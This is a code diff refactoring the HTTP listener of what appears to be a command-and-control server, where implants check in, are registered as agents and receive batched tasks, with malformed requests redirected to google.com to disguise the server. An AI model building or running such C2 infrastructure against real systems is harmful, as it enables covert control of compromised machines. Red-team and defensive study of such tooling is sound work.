@@ -1,28 +1,34 @@
 import json
+import threading
 
-from .models import AgentModel, ImplantModel
-from .tasks import TaskManager
-from flask import Blueprint, redirect, request, jsonify
-
-check_in_blueprint = Blueprint('check_in', __name__)
-task_manager = TaskManager()
+from connect.output import display
+from .models import AgentModel, db, ImplantModel
+from flask import redirect, request, jsonify
 
 
-@check_in_blueprint.route('/<path:route>', methods=['POST'])
-def check_in(route):
-    try:
-        batch_response = json.loads(request.get_data())
-    except json.decoder.JSONDecodeError:
-        data = request.get_data().decode('utf-8')
-        print(f'Failed to parse batch response as JSON:\n{data}')
-        print(f'-'*20)
-        return redirect("https://www.google.com")
+class HTTPListenerRoutes:
 
-    if isinstance(batch_response, dict):
-        print('Retrieved implant authentication' + str(batch_response))
-        implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
-        agent = AgentModel(implant=implant)
-        return agent.check_in_task_id
+    def __init__(self, flask_app, task_manager):
+        self.flask_app = flask_app
+        self.task_manager = task_manager
+        self.flask_app.add_url_rule('/<path:route>', 'check_in', self.check_in, methods=['POST'])
 
-    batch_request = task_manager.parse_batch_response(batch_response)
-    return jsonify(batch_request)
+    def check_in(self, route):
+        try:
+            batch_response = json.loads(request.get_data())
+        except json.decoder.JSONDecodeError:
+            data = request.get_data().decode('utf-8')
+            display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
+            return redirect("https://www.google.com")
+
+        if isinstance(batch_response, dict):
+            display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
+            implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
+            agent = AgentModel(implant=implant)
+            db.session.add(agent)
+            db.session.commit()
+            display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
+            return str(agent.check_in_task_id)
+
+        batch_request = self.task_manager.parse_batch_response(batch_response)
+        return jsonify(batch_request)
